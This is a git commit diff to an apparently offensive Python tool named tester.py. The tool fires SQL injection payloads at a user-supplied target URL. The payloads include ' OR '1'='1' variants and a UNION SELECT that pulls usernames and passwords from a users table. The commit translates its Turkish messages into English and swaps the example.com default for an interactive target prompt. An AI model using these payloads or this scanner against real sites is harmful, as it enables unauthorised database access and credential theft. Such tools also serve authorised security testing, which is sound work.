50d20fa66df34998bcf9575d7fff017879d3f0b2
İNTİKAM21 CYBER <167871296+Intikam21kurucu@users.noreply.github.com>
2024-10-20 08:47:12 +0300

    Update tester.py

--- modules/Auxiliary/sql_injection/tester.py
+++ modules/Auxiliary/sql_injection/tester.py
@@ -1,6 +1,7 @@
 import requests
 
 def sql_injection_tester(target_url):
+    """[Test for SQL Injection vulnerabilities]"""
     payloads = ["' OR '1'='1", "' OR '1'='1' --", "' OR '1'='1' #", "' UNION SELECT NULL, username, password FROM users --"]
     vulnerable_urls = []
 
@@ -9,14 +10,14 @@ def sql_injection_tester(target_url):
         response = requests.get(url)
         
         if response.status_code == 200 and "error" not in response.text.lower():
-            print(f"Potansiyel SQL Injection Zafiyeti: {url}")
+            print(f"Potential SQL Injection Vulnerability: {url}")
             vulnerable_urls.append(url)
 
     if not vulnerable_urls:
-        print("SQL Injection zafiyeti bulunamadı.")
+        print("No SQL Injection vulnerabilities found.")
     
     return vulnerable_urls
 
-# Kullanım örneği
-target_url = "http://example.com/page?id="
+# User input
+target_url = input("\033[91mint4 [Enter the Target URL] > \033[0m")
 sql_injection_tester(target_url)
